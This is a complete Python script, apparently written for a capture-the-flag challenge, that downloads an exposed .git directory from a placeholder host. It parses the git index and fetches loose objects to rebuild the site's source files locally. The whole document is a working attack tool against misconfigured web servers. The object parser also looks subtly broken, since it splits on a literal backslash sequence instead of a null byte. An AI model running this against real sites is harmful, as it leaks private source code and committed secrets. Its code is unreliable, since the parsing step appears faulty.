#!/usr/bin/env python3
# VecNet helper: recover selected objects from an exposed .git directory.
# Replace HOST with your own challenge instance before running.
import os, struct, urllib.request, zlib

HOST = "<CHALLENGE-HOST>"
BASE = f"https://{HOST}"
UA = "Mozilla/5.0"
OUT = "recovered_git"


def get(path):
    req = urllib.request.Request(BASE + path, headers={"User-Agent": UA})
    return urllib.request.urlopen(req, timeout=20).read()


def git_object(sha):
    raw = get(f"/.git/objects/{sha[:2]}/{sha[2:]}")
    dec = zlib.decompress(raw)
    kind_size, body = dec.split(b"\\x00", 1)
    return kind_size.decode(), body


def parse_index(data):
    sig, version, count = struct.unpack(">4sII", data[:12])
    assert sig == b"DIRC"
    off = 12
    entries = []
    for _ in range(count):
        entry_start = off
        off += 16 + 8
        mode = struct.unpack(">I", data[off:off+4])[0]; off += 4
        off += 4 + 4
        size = struct.unpack(">I", data[off:off+4])[0]; off += 4
        sha = data[off:off+20].hex(); off += 20
        flags = struct.unpack(">H", data[off:off+2])[0]; off += 2
        namelen = flags & 0x0FFF
        name = data[off:off+namelen].decode(); off += namelen
        while (off - entry_start) % 8:
            off += 1
        entries.append((name, sha, size, mode))
    return entries


def main():
    os.makedirs(OUT, exist_ok=True)
    head = get("/.git/HEAD").decode().strip()
    print("HEAD:", head)
    master = get("/.git/refs/heads/master").decode().strip()
    print("master:", master)
    index = get("/.git/index")
    for name, sha, size, mode in parse_index(index):
        print(f"{name:20} {sha} size={size}")
        kind, body = git_object(sha)
        if kind.startswith("blob"):
            path = os.path.join(OUT, name)
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            open(path, "wb").write(body)

if __name__ == "__main__":
    main()
